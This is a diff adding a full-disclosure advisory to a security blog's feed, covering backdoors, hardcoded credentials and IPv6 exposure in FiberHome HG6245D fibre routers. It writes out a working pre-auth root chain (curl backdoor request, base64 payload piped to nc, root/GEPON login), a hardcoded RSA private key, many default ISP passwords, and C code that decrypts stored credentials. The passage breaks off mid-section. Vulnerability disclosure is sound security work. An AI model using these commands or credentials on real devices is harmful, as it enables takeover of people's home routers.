@@ -4,6 +4,705 @@
     <title>IT Security Research by Pierre</title>
     
     <entry>
+        <title>Multiple vulnerabilities found in FiberHome HG6245D routers</title>
+        <link href="2021-01-12-fiberhome-ont-0day-vulnerabilities.html"/>
+        <content type="html"><h2>Product Description</h2>
+<p>FiberHome Technologies is a leading equipment vendor and global solution provider in the field of information technology and telecommunications.</p>
+<p>The FiberHome HG6245D routers are GPON FTTH routers. They are mainly used in South America and 
+in Southeast Asia (from Shodan). These devices come with competitive pricing but are very powerful, with a lot of memory and storage.</p>
+<p>I validated the vulnerabilities against HG6245D, RP2602:</p>
+<pre><code>Config# show version
+show version
+Hardware version : WKE2.094.277A01
+Software version : RP2602
+Minor version : 00.00
+Basic part version : RP2602
+Generate time : Apr  1 2019 19:38:05
+</code></pre>
+<p><strong>UPDATE Feb 7, 2021 - the latest firmware version (RP2613) is also vulnerable. The vulnerabilities have been confirmed in the latest firmware image (RP2613).</strong></p>
+<p>Some vulnerabilities have been tested successfully against another fiberhome device (AN5506-04-FA, firmware RP2631, 4 April 2019). The fiberhome devices have quite a similar codebase, so it is likely all other fiberhome devices (AN5506-04-FA, AN5506-04-FAT, AN5506-04-F) are also vulnerable.</p>
+<p>On the first analysis, attack surface is not huge:</p>
+<ul>
+<li>only HTTP/HTTPS is listening by default on the LAN</li>
+<li>It is also possible to enable a CLI telnetd (not reachable by default) on port 23/tcp by using hardcoded credentials on the web admin interface (<code>https://target/fh</code>).</li>
+</ul>
+<p>Futhermore, due to the lack of firewall for IPv6 connectivity, all the internal services will be reachable over IPv6 (from the Internet).</p>
+<p>It is in fact trivial to achieve pre-auth RCE as root against the device, from the WAN (using IPv6) and from the LAN (IPv4 or IPv6).</p>
+<p>This scenario involves reaching the webserver to:</p>
+<ol>
+<li>enable a proprietary CLI telnetd (using backdoor credentials for HTTP or using the backdoor <code>/telnet</code> HTTP API or using a stack overflow in the HTTP server in previous fiberhome routers [and skipping next steps])</li>
+<li>enable the Linux telnetd using authentication bypass or with backdoor credentials</li>
+<li>use backdoor credentials to get a root shell on the Linux telnetd</li>
+</ol>
+<p>Example of such scenario in 4 steps from a different network:</p>
+<pre><code>$ curl -k https://target/info.asp # pre-auth infoleak, extract the WAN MAC, very similar to the br0 MAC,
+                                  # used to enable the next backdoor. On the same network segment,
+                                  # use `arp -na`
+$ curl -k 'https://target/telnet?enable=1&amp;key=ENDING_PART_MAC_ADDR'  # backdoor access to authorize access
+                                                                     # to CLI telnet on port 23/tcp
+$ echo GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc target 23 &gt;/dev/null &amp; # auth bypass + start of
+                                                                                    # Linux telnetd on port
+                                                                                    # 26/tcp
+$ telnet target 26                # backdoor root access with root / GEPON
+(none) login: root
+Password: [GEPON]
+BusyBox v1.27.2 (2019-04-01 19:16:06 CST) built-in shell (ash)
+#id
+uid=0(root) gid=0 groups=0 # game over
+</code></pre>
+<p>Please note this research was done in the beginning of 2020 and a new firmware image may be available and may patch some vulnerabilities (even if I highly doubt it). This research was supposed to be presented during a private security event last year which was postponed due to the COVID-19 situation.</p>
+<p>Full-disclosure is applied as it is believed that some backdoors have been intentionally placed by the vendor.</p>
+<p>Also, it is public knowledge from 2019 that Fiberhome devices have weak passwords and RCE vulnerabilities. This quote is from 2019:</p>
+<blockquote>
+<p>We didn't see how Gwmndy malware spread, but we know that some Fiberhome router Web systems have weak passwords and there are RCE vulnerabilities.</p>
+<p>-- <a href="https://blog.netlab.360.com/some-fiberhome-routers-are-being-utilized-as-ssh-tunneling-proxy-nodes-2/">https://blog.netlab.360.com/some-fiberhome-routers-are-being-utilized-as-ssh-tunneling-proxy-nodes-2/</a></p>
+</blockquote>
+<h2>Vulnerabilities Summary</h2>
+<p>The summary of the vulnerabilities is:</p>
+<ol>
+<li><a href="#insecure-ipv6">Insecure IPv6 connectivity - CVE-2021-27170</a></li>
+<li><a href="#httpd-passwords-logs">HTTP Server - Passwords in HTTP logs - CVE-2021-27140</a></li>
+<li><a href="#httpd-ssl-certificates">HTTP Server - Harcoded SSL certificates- CVE-2021-27142</a></li>
+<li><a href="#httpd-infoleak">HTTP server - Pre-auth InfoLeak - CVE-2021-27139</a></li>
+<li><a href="#httpd-backdoor-telnet">HTTP Server - Backdoor allowing telnet access - CVE-2021-27173</a></li>
+<li><a href="#httpd-hardcoded-credentials">HTTP Server - Hardcoded credentials - CVE-2021-27143 - CVE-2021-27144 - CVE-2021-27145 - CVE-2021-27146 - CVE-2021-27147 - CVE-2021-27148 - CVE-2021-27149 - CVE-2021-27150 - CVE-2021-27151 - CVE-2021-27152 - CVE-2021-27153 - CVE-2021-27154 - CVE-2021-27155 - CVE-2021-27156 - CVE-2021-27157 - CVE-2021-27158 - CVE-2021-27159 - CVE-2021-27160 - CVE-2021-27161 - CVE-2021-27162 - CVE-2021-27163 - CVE-2021-27164</a></li>
+<li><a href="#httpd-tr09-hardcoded-credentials">HTTP Server - TR-069 hardcoded credentials</a></li>
+<li><a href="#httpd-decryption-algorithm">HTTP Server - Credentials decryption algorithm - CVE-2021-27141</a></li>
+<li><a href="#telnet-linux-hardcoded-credentials">Telnet server (Linux) - Hardcoded credentials - CVE-2021-27172</a></li>
+<li><a href="#telnet-cli-hardcoded-credentials">Telnet server (CLI) - Hardcoded credentials - CVE-2021-27165 - CVE-2021-27166 - CVE-2021-27167 - CVE-2021-27168 - CVE-2021-27169</a></li>
+<li><a href="#telnet-cli-privilege-escalation">Telnet server (CLI) - Privilege escalation - CVE-2021-27171</a></li>
+<li><a href="#telnet-cli-auth-bypass">Telnet server (CLI) - Authentication bypass - CVE-2021-27177</a></li>
+<li><a href="#telnet-cli-auth-bypass-linux-telnetd">Telnet server (CLI) - Authentication bypass to start the Linux telnetd</a></li>
+<li><a href="#telnet-cli-dos">Telnet server (CLI) - DoS - CVE-2021-27179</a></li>
+<li><a href="#system-credentials-clear-text-files">System - Credentials stored in clear-text - CVE-2021-27174 - CVE-2021-27175 - CVE-2021-27176</a></li>
+<li><a href="#system-credentials-clear-text-nvram">System - Passwords stored in clear-text in nvram - CVE-2021-27178</a></li>
+<li><a href="#misc-remote-stack-overflow-an5506">Misc - Remote stack overflow in the HTTP server (AN5506-04-FA / RP2631)</a></li>
+</ol>
+<p>I removed several DoS and strange technical details (linked to undisclosed vulnerabilities) for clarity.</p>
+<p><a id="insecure-ipv6"></a></p>
+<h2>Details - Insecure IPv6 connectivity</h2>
+<p>By default, there are no firewall rules for the IPv6 connectivity, exposing the internal management interfaces from the Internet.</p>
+<p>An attacker can get a full access to the management http server (using hardcoded passwords) and the telnet services, by reaching the IPv6s assigned to the wan0 and the br0 interfaces.</p>
+<p>On the device:</p>
+<pre><code>#ifconfig wan0
+wan0      Link encap:Ethernet  HWaddr [REMOVED]
+          [...]
+          inet6 addr: [REMOVED]/64 Scope:Global
+          [...]
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+#ifconfig br0
+br0       Link encap:Ethernet  HWaddr [REMOVED]
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: [REMOVED]/64 Scope:Global
+          [...]
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</code></pre>
+<p><code>br0</code> is the internal network interface assigned to the LAN.
+All the services are binding to both <code>br0</code> and <code>wan0</code>.</p>
+<p>It is trivial to reach services from the WAN (Internet), by contacting IPv6 used by <code>br0</code> or <code>wan0</code>:</p>
+<p>From the WAN:</p>
+<pre><code>rasp-wan-olt% telnet [ipv6] 26
+Trying [ipv6]...
+Connected to [ipv6].
+Escape character is '^]'.
+
+(none) login: 
+telnet&gt; q
+Connection closed.
+
+rasp-wan-olt% telnet [ipv6] 80
+Trying [ipv6]...
+Connected to [ipv6].
+Escape character is '^]'.
+GET / HTTP/1.0
+
+HTTP/1.0 302 Redirect
+Server: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN
+Date: Mon Jan  7 21:01:29 2020
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+X-Frame-Options: SAMEORIGIN
+Location: https://
+
+&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;
+                This document has moved to a new &lt;a href="https://"&gt;location&lt;/a&gt;.
+                Please update your documents to reflect the new location.
+                &lt;/body&gt;&lt;/html&gt;
+
+Connection closed by foreign host.
+rasp-wan-olt%
+</code></pre>
+<p>By using <code>ip6tables</code> on the device, we can confirm the complete lack of firewall rules for IPv6 connectivity:</p>
+<pre><code>#ip6tables -nL
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+forward_ext_ip  all      ::/0                 ::/0                
+forward_ext_url  all      ::/0                 ::/0                
+forward_ext_mac  all      ::/0                 ::/0
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination
+
+Chain forward_ext_ds_ip (1 references)
+target     prot opt source               destination
+
+Chain forward_ext_ip (1 references)
+target     prot opt source               destination         
+forward_ext_us_ip  all      ::/0                 ::/0                
+forward_ext_ds_ip  all      ::/0                 ::/0
+
+Chain forward_ext_mac (1 references)
+target     prot opt source               destination
+
+Chain forward_ext_url (1 references)
+target     prot opt source               destination
+
+Chain forward_ext_us_ip (1 references)
+target     prot opt source               destination         
+#
+</code></pre>
+<p>I highly recommend disabling IPv6 connectivity.</p>
+<p><a id="httpd-passwords-logs"></a></p>
+<h2>Details - HTTP Server - Passwords in HTTP logs</h2>
+<p>It is possible to find passwords and authentication cookies stored in clear-text in HTTP logs:</p>
+<pre><code>#cat /fhconf/web_log/web.log
+web_utils&gt;2020-01-07 19:16:26,../utils/cu_sessionManagement.c[465](findUser): no user named admin !
+&lt;web_custom&gt;2020-01-07 19:16:27,../custom/weblogin.c[595](webLogin): *************userGroupName = 1
+&lt;web_init&gt;2020-01-07 19:16:27,../utils/utils.c[1399](get_admin_default_info): enter get_admin_default_info
+&lt;web_custom&gt;2020-01-07 19:16:27,../custom/weblogin.c[812](webLogin): Warning! Password error! password = [REMOVED]
+&lt;web_utils&gt;2020-01-07 19:27:24,../utils/cu_sessionManagement.c[238](createSession): create user [REMOVED]
+</code></pre>
+<p><a id="httpd-ssl-certificates"></a></p>
+<h2>Details - HTTP Server - Harcoded SSL certificates</h2>
+<p>The web management is done over HTTPS, using a hardcoded private key with 777 permissions:</p>
+<pre><code>#ls -la /fhrom/bin/web/certSrv.pem /fhrom/bin/web/privkeySrv.pem
+-rwxrwxrwx    1 root     0              883 Apr  1  2019 /fhrom/bin/web/certSrv.pem
+-rwxrwxrwx    1 root     0              887 Apr  1  2019 /fhrom/bin/web/privkeySrv.pem
+#cat /fhrom/bin/web/privkeySrv.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIICWwIBAAKBgQCY22+N/5InUhmotgU8jh9nQdyTmKYwFJKpvMek9fJK8rCsrED7
+yl+mvUPv3yqLyMgvu1AcMmYEyngpbw94rnd2k91wiRGUGUSq8mTRPFwnplTPI8hI
+JglMsKcskzRP951jxsiSS1eMlLcEd9iMUcpjUbgWzxKH0fFlRD5d8jYPtwIDAQAB
+AoGANEjy6n5d7sc9caD5P5JZmYdEvNO9HLscw6SIIZvjCdHjrtyoybeaaj1ZDKao
+NfIyz2jh6RMwJDlhSsLrZts+jzB+k7fAqUkdLi6fkZmpamL1OEHMqzWdWuVFgCjd
+uf8ZMMuQ+/3gx/tjjG0sBuL/ko1Q7oxoIty+4xm9cwqGGtkCQQDKIJYYp9385gk4
+8qDcdgnc39kmsheUB5VS0pU1/pxL2YIJltq79yghwQisaNsUUk4LMW6hNyPx7Knx
+jRpHLsgTAkEAwZkVbjo3Ll+fM+1oPPcY4i960DURrR9eMVhq771n+GzCs9gEy2Ea
+HW5f0yamZBMURZWECu1W0s764QkHXwzWTQJAaYGi95HAVT86NyinAQz4TvvlnMY/
+enyO3GGhk0KpEQqjTyAYYx87KotZXK2LFct0g3E1Hx/qOmDfwH935QotUwJAH4mE
+iDRLkO5azOa7uFK4ZwA9DXXXr1AQ1BEHOo6sRTfSb+GcxlTHIEw+p/L/4AWLo9o7
+bFxFbInzLH2ACefZcQJAJ+US+g9Dp4tiLrenketRv9+3nOPGod2WOGqjMaEqOgmC
+RjGu2aI9YguR3FuX3W9KOOg3EDn/l/O1XynBPRO9Aw==
+-----END RSA PRIVATE KEY-----
+#cat /fhrom/bin/web/certSrv.pem
+-----BEGIN CERTIFICATE-----
+MIICXzCCAcgCCQCqr5AgCgFdqzANBgkqhkiG9w0BAQUFADB0MQswCQYDVQQGEwJD
+SDELMAkGA1UECBMCSFUxCzAJBgNVBAcTAldVMQswCQYDVQQKEwJGSDELMAkGA1UE
+CxMCU0YxDDAKBgNVBAMTA1BPTjEjMCEGCSqGSIb3DQEJARYUUE9OQEZJQkVSSE9N
+RS5DT00uQ04wHhcNMTMwNDI0MDEyMTUwWhcNMjMwNDIyMDEyMTUwWjB0MQswCQYD
+VQQGEwJDSDELMAkGA1UECBMCSFUxCzAJBgNVBAcTAldVMQswCQYDVQQKEwJGSDEL
+MAkGA1UECxMCU0YxDDAKBgNVBAMTA1BPTjEjMCEGCSqGSIb3DQEJARYUUE9OQEZJ
+QkVSSE9NRS5DT00uQ04wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAJjbb43/
+kidSGai2BTyOH2dB3JOYpjAUkqm8x6T18krysKysQPvKX6a9Q+/fKovIyC+7UBwy
+ZgTKeClvD3iud3aT3XCJEZQZRKryZNE8XCemVM8jyEgmCUywpyyTNE/3nWPGyJJL
+V4yUtwR32IxRymNRuBbPEofR8WVEPl3yNg+3AgMBAAEwDQYJKoZIhvcNAQEFBQAD
+gYEACZJepEU36h3PMc0O15Bo7zkBWm2dD0RbTrJeZF561VcxlpuE2GDirNCXAbZz
+Ue/x+fDQBEM8kqpFYcVMPzZBUdFwu1QIY0DottXVcFFNoKS54GL9LEMaS6l6R/D5
+G8bCy/RF3kZwzE2cflZ7x78zdpQpzzDcOD415ek5zkadhu0=
+-----END CERTIFICATE-----
+#
+</code></pre>
+<p>Another hardcoded private key is also available (?!) in <code>/fhrom/bin/web</code> and can be downloaded over HTTPS:</p>
+<pre><code>#ls -la /fhrom/bin/web/privkeySrv.pem
+-rwxrwxrwx    1 root     0              887 Apr  1  2019 /fhrom/bin/web/privkeySrv.pem
+
+$ curl -k https://192.168.1.1/privkeySrv.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIICWwIBAAKBgQCY22+N/5InUhmotgU8jh9nQdyTmKYwFJKpvMek9fJK8rCsrED7
+yl+mvUPv3yqLyMgvu1AcMmYEyngpbw94rnd2k91wiRGUGUSq8mTRPFwnplTPI8hI
+JglMsKcskzRP951jxsiSS1eMlLcEd9iMUcpjUbgWzxKH0fFlRD5d8jYPtwIDAQAB
+AoGANEjy6n5d7sc9caD5P5JZmYdEvNO9HLscw6SIIZvjCdHjrtyoybeaaj1ZDKao
+NfIyz2jh6RMwJDlhSsLrZts+jzB+k7fAqUkdLi6fkZmpamL1OEHMqzWdWuVFgCjd
+uf8ZMMuQ+/3gx/tjjG0sBuL/ko1Q7oxoIty+4xm9cwqGGtkCQQDKIJYYp9385gk4
+8qDcdgnc39kmsheUB5VS0pU1/pxL2YIJltq79yghwQisaNsUUk4LMW6hNyPx7Knx
+jRpHLsgTAkEAwZkVbjo3Ll+fM+1oPPcY4i960DURrR9eMVhq771n+GzCs9gEy2Ea
+HW5f0yamZBMURZWECu1W0s764QkHXwzWTQJAaYGi95HAVT86NyinAQz4TvvlnMY/
+enyO3GGhk0KpEQqjTyAYYx87KotZXK2LFct0g3E1Hx/qOmDfwH935QotUwJAH4mE
+iDRLkO5azOa7uFK4ZwA9DXXXr1AQ1BEHOo6sRTfSb+GcxlTHIEw+p/L/4AWLo9o7
+bFxFbInzLH2ACefZcQJAJ+US+g9Dp4tiLrenketRv9+3nOPGod2WOGqjMaEqOgmC
+RjGu2aI9YguR3FuX3W9KOOg3EDn/l/O1XynBPRO9Aw==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p><a id="httpd-infoleak"></a></p>
+<h2>Details - HTTP server - Pre-auth InfoLeak</h2>
+<p>It is possible to extract information from the device without authentication by disabling Javascript and visiting <code>/info.asp</code>:</p>
+<pre><code>$ curl -k https://192.168.1.1/info.asp
+[..]
+
+Software Version: [REMOVED]
+[...]
+ONU State: [REMOVED]
+Regist State: [REMOVED]
+LOID: [REMOVED] &lt;----------- Secret used for FTTH connection
+[...]
+IP Address: [REMOVED]
+Subnet Mask: [REMOVED]
+IPv6 Address: [REMOVED]
+DHCP Clients List: [REMOVED]
+Wan IP: [REMOVED]
+WAN Mac: [REMOVED] &lt;-------- Used for the telnet backdoor
+[...]
+</code></pre>
+<p>Also, it is very easy to guess the MAC address of the <code>br0</code> interface based on the WAN MAC address (e.g.: <code>wan0</code>: <code>xx:xx:xx:xx:xx:x3</code>, <code>br0</code> will be <code>xx:xx:xx:xx:xx:x0</code>).</p>
+<p><a id="httpd-backdoor-telnet"></a></p>
+<h2>Details - HTTP Server - Backdoor allowing telnet access</h2>
+<p>In order to reach the telnetd CLI server, it is also possible to reach a backdoor API without authentication provided by the HTTP server. This will remove firewall rules and allow an attacker to reach the telnet server (used for CLI).</p>
+<p>This backdoor can be found inside the <code>webs</code> binary:</p>
+<p>From <code>sub_C46F8()</code> (called from main()):</p>
+<p><img alt="" src="images/2021-fiberhome-sub_C46F8.png" />
+<center>Pseudo-code of <code>sub_C46F8()</code></center></p>
+<p>The <code>backdoor_telnet()</code> function (named during reverse engineering, the original name is unknown):</p>
+<p><img alt="" src="images/2021-fiberhome-backdoor_telnet.png" />
+<center>Pseudo-code of <code>backdoor_telnet()</code></center></p>
+<p>We can reverse the function <code>omci_set_telnet_uni_state()</code> from <code>libgl3_advance.so</code>:</p>
+<p><img alt="" src="images/2021-fiberhome_omci_set_telnet_uni_state.png" />
+<center>Pseudo-code of <code>omci_set_telnet_uni_state()</code></center></p>
+<p>On line 24, rules will be added depending of the value of the argument of this function.</p>
+<p>Finally, the <code>getOnuMac()</code> function will provide a custom valid entry from the MAC address of the <code>br0</code> interface:</p>
+<p><img alt="" src="images/2021-fiberhome-getOnuMac.png" />
+<center>Pseudo-code of <code>getOnuMac()</code></center></p>
+<p>The backdoor is reachable by sending a HTTPS request: </p>
+<ul>
+<li><code>https://[ip]/telnet?enable=0&amp;key=calculated(BR0_MAC)</code></li>
+</ul>
+<p>The 'secret' algorithm will extract the ending part of the mac address.</p>
+<p>For the MAC: AA:AA:AA:01:02:03, an attacker can enable the backdoor by sending:</p>
+<pre><code>$ curl -k 'https://[ip]/telnet?enable=1&amp;key=010203'
+</code></pre>
+<p>Opening the access to the telnetd:</p>
+<pre><code>$ curl -k 'https://192.168.1.1/telnet?enable=1&amp;key=[REMOVED]'
+Open telnet success!
+$ telnet 192.168.1.1
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+
+------acl IP:192.168.1.2 --------
+Login: 
+telnet&gt; q
+Connection closed.
+</code></pre>
+<p>Closing the access to the telnetd:</p>
+<pre><code>$ curl -k 'https://192.168.1.1/telnet?enable=0&amp;key=[REMOVED]'
+$ telnet 192.168.1.1 23
+Trying 192.168.1.1...
+telnet: connect to address 192.168.1.1: Connection refused
+telnet: Unable to connect to remote host
+</code></pre>
+<p>The IPv4 firewall rules before and after triggering the backdoor:</p>
+<p>Access is being blocked:</p>
+<pre><code>#iptables-save |grep telnet
+:input_ext_access_telnet_ani - [0:0]
+:input_ext_access_telnet_uni - [0:0]
+-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_uni
+-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_ani
+-A input_ext_access_telnet_ani -i tel0 -p tcp -m tcp --dport 23 -j ACCEPT
+-A input_ext_access_telnet_ani -i br0 -p tcp -m tcp --dport 23 -j ACCEPT
+-A input_ext_access_telnet_ani -p tcp -m tcp --dport 23 -j REJECT --reject-with tcp-reset
+-A input_ext_access_telnet_uni -i br0 -p tcp -m tcp --dport 23 -j REJECT --reject-with tcp-reset
+</code></pre>
+<p>Access is allowed:</p>
+<pre><code>#iptables-save |grep telnet
+:input_ext_access_telnet_ani - [0:0]
+:input_ext_access_telnet_uni - [0:0]
+-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_uni
+-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_ani
+-A input_ext_access_telnet_ani -i tel0 -p tcp -m tcp --dport 23 -j ACCEPT
+-A input_ext_access_telnet_ani -i br0 -p tcp -m tcp --dport 23 -j ACCEPT
+-A input_ext_access_telnet_ani -p tcp -m tcp --dport 23 -j REJECT --reject-with tcp-reset
+</code></pre>
+<p><a id="httpd-hardcoded-credentials"></a></p>
+<h2>Details - HTTP Server - Hardcoded credentials</h2>
+<p>The web daemon contains a list of hardcoded credentials, for different ISPs:</p>
+<ul>
+<li>user / user1234</li>
+<li>f~i!b@e#r$h%o^m*esuperadmin / s(f)u_h+g|u</li>
+<li>admin / lnadmin</li>
+<li>admin / CUadmin</li>
+<li>admin / admin</li>
+<li>telecomadmin / nE7jA%5m</li>
+<li>adminpldt / z6dUABtl270qRxt7a2uGTiw</li>
+<li>gestiontelebucaramanga / t3l3buc4r4m4ng42013</li>
+<li>rootmet / m3tr0r00t</li>
+<li>awnfibre / fibre@dm!n</li>
+<li>trueadmin / admintrue</li>
+<li>admin / G0R2U1P2ag</li>
+<li>admin / 3UJUh2VemEfUtesEchEC2d2e</li>
+<li>admin / getOnuMac(s, 6, 32); &lt;- last part of the MAC address of the <code>br0</code> interface</li>
+<li>admin / 888888</li>
+<li>L1vt1m4eng / 888888</li>
+<li>useradmin / 888888</li>
+<li>user / 888888</li>
+<li>admin / 1234</li>
+<li>user / tattoo@home</li>
+<li>admin / tele1234</li>
+<li>admin / aisadmin</li>
+</ul>
+<p>You can find the incomplete list below:</p>
+<p><img alt="" src="images/2021-fiberhome-webs-hardcoded-passwords-00.png" /></p>
+<p><img alt="" src="images/2021-fiberhome-webs-hardcoded-passwords-01.png" /></p>
+<p>I really like <code>m3tr0r00t</code> :)</p>
+<p>There are passwords everywhere in the <code>webs</code> binary (HTTP Server).</p>
+<p>These credentials, used with <code>https://ip/fh</code> will allow to open the access to the CLI telnet on port 23/tcp.</p>
+<p><a id="httpd-tr09-hardcoded-credentials"></a></p>
+<h2>Details - HTTP Server - TR-069 hardcoded credentials</h2>
+<p>We can find hardcoded credentials inside the <code>webs</code> binary for TR-069:</p>
+<p><code>telecomadmin</code></p>
+<p><img alt="" src="images/2021-fiberhome-webs-itms-hardcoded-login.png" />
+<center>Pseudo-code from <code>webs</code></center></p>
+<p><a id="httpd-decryption-algorithm"></a></p>
+<h2>Details - HTTP Server - Credentials decryption algorithm</h2>
+<p>By default, some credentials appear to be encrypted (in <code>/fhconf/umconfig.txt</code> file).</p>
+<p>It is possible to decrypt them using the encryption function found inside the webs binary. This algorithm uses mainly xor with the hardcoded key <code>*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&amp;^#@$a2s0i3g</code> so we can encrypt passwords and decrypt "encrypted" passwords:</p>
+<p><img alt="" src="images/2021-fiberhome-webs-decrypt-passwords.png" />
+<center>Pseudo-code from <code>decrypt_password()</code></center></p>
+<p>A re-implementation in C can be shown below:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;string.h&gt;</span><span style="color: #BC7A00"></span>
+
+<span style="color: #B00040">int</span>       <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>    argc,
+               <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>argv,
+               <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>envp)
+{
+  <span style="color: #B00040">char</span> key[<span style="color: #666666">45</span>] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&amp;^#@$a2s0i3g&quot;</span>;
+
+  <span style="color: #B00040">char</span> password[<span style="color: #666666">12</span>] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x59\x42\x51\x48\x5d\x13\x4b\x52\x3d\x45\x4d\x00</span><span style="color: #BA2121">&quot;</span>;
+  <span style="color: #408080; font-style: italic">//char password[12] = &quot;s(f)u_h+g|u\x00&quot;;</span>
+
+  <span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span> encrypted_char;
+
+  <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #B00040">int</span> i <span style="color: #666666">=</span> <span style="color: #666666">0</span>; i <span style="color: #666666">&lt;</span> strlen(password); i<span style="color: #666666">++</span>)
+  {
+    encrypted_char <span style="color: #666666">=</span> password[i] <span style="color: #666666">^</span> key[i <span style="color: #666666">%</span> <span style="color: #008000; font-weight: bold">sizeof</span>(key)];
+
+    <span style="color: #008000; font-weight: bold">if</span> (encrypted_char <span style="color: #666666">&amp;&amp;</span> <span style="color: #666666">!</span>(encrypted_char <span style="color: #666666">&amp;</span> <span style="color: #666666">0x2000</span>))
+      printf(<span style="color: #BA2121">&quot;%c&quot;</span>, encrypted_char);
+  }
+
+  printf(<span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+
+  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
+}
+</pre></div>
+
+<p>And it works:</p>
+<pre><code>$ cc decrypt-passwords-umconfig.c -o decrypt-passwords-umconfig &amp;&amp; ./decrypt-passwords-umconfig | hexdump -C
+00000000  73 28 66 29 75 5f 68 2b  67 7c 75 0a              |s(f)u_h+g|u.|
+0000000c
+</code></pre>
+<p>Interesting fact: we previously found this hardcoded key in FTTH OLTs from another FTTH vendor:</p>
+<p><a href="https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html#weak-encryption-algorithm">https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html#weak-encryption-algorithm</a></p>
+<p>It appears this key and this algorithm come from GoAhead:</p>
+<p><a href="https://github.com/BruceYang-yeu/goahead-1/blob/master/um.c#L51">https://github.com/BruceYang-yeu/goahead-1/blob/master/um.c#L51</a></p>
+<p><a id="telnet-linux-hardcoded-credentials"></a></p>
+<h2>Details - Telnet server (Linux) - Hardcoded credentials</h2>
+<p>A hardcoded password for root is being defined inside <code>/etc/init.d/system-config.sh</code>:</p>
+<pre><code>#cat /etc/init.d/system-config.sh
+#!/bin/sh
+
+case "$1" in
+        start)
+                echo "Configuring system..."
+                # these are some miscellaneous stuff without a good home
+                mount -o remount,sync /fhconf
+                mkdir -p /dev/shm/fhdrv_kdrv_ver_tmp /dev/shm/usr_tmp /fhconf/data
+                echo "root:W/xa5OyC3jjQU:0:0:root:/:bin/sh" &gt; /etc/passwd
+                echo "nobody:x:99:99:Nobody:/:/bin/false" &gt;&gt; /etc/passwd
+                ifconfig lo 127.0.0.1 netmask 255.0.0.0 broadcast 127.255.255.255 up
+                echo &gt; /var/udhcpd/udhcpd.leases
+                exit 0
+                ;;
+
+# cat /etc/passwd
+root:W/xa5OyC3jjQU:0:0:root:/:bin/sh
+nobody:x:99:99:Nobody:/:/bin/false
+</code></pre>
+<p><code>W/xa5OyC3jjQU</code> is the DES encrypted data for <code>GEPON</code>.</p>
+<p>This telnet server doesn't run by default but it is possible to start it from the telnet CLI.</p>
+<p><a id="telnet-cli-hardcoded-credentials"></a></p>
+<h2>Details - Telnet server (CLI) - Hardcoded credentials</h2>
+<p>telnet on port 23/tcp can be also abused with these credentials:</p>
+<ul>
+<li><code>gpon</code>/<code>gpon</code></li>
+<li>enable: <code>gpon</code></li>
+</ul>
+<p>Demo:</p>
+<pre><code>$ nc -v 192.168.1.1 23
+Connection to 192.168.1.1 23 port [tcp/telnet] succeeded!
+
+------acl IP:192.168.1.2 --------
+Login: gpon
+gpon
+Password: gpon
+User&gt; enable
+enable
+Password: gpon
+****
+Config#
+</code></pre>
+<p>We can retrieve these backdoors by reversing the <code>libci_adaptation_layer.so</code> library:</p>
+<p><img alt="" src="images/2021-fiberhome-addDefualLoginAndUser.png" />
+<center>Pseudo-code of <code>addDefualLoginAndUser()</code> from <code>libci_adaptation_layer.so</code></center></p>
+<p>For specific ISPs, there are these valid credentials:</p>
+<ul>
+<li><code>admin</code> / 4 hexadecimal chars, generated in the <code>init_3bb_password()</code> function located in <code>libci_adaptation_layer.so</code></li>
+<li><code>rdsadmin</code> / <code>6GFJdY4aAuUKJjdtSn7d</code></li>
+</ul>
+<p>You can also test <code>gepon</code>/<code>gepon</code> (from the firmware extracted in the other analyzed fiberhome device (AN5506-04-FA, firmware RP2631, 4 April 2019)).</p>
+<p><a id="telnet-cli-privilege-escalation"></a></p>
+<h2>Details - Telnet server (CLI) - Privilege escalation</h2>
+<p>The CLI telnet server runs on port 23/tcp and can be reached by (i) adding firewall rules from the HTTP server either using the backdoor API, (ii) using backdoor credentials on the web interface or (iii) exploiting a stack overflow in previous HTTP daemons.
+It is also reachable by default over IPv6 on <code>br0</code> and <code>wan0</code> interface.</p>
+<p>It is possible to start a Linux telnetd as root on port 26/tcp using the CLI interface, as shown below:</p>
+<pre><code>User&gt; ddd
+WRI(DEBUG_H)&gt; shell
+Please use port 26 to telnet 
+WRI(DEBUG_H)&gt; tshell
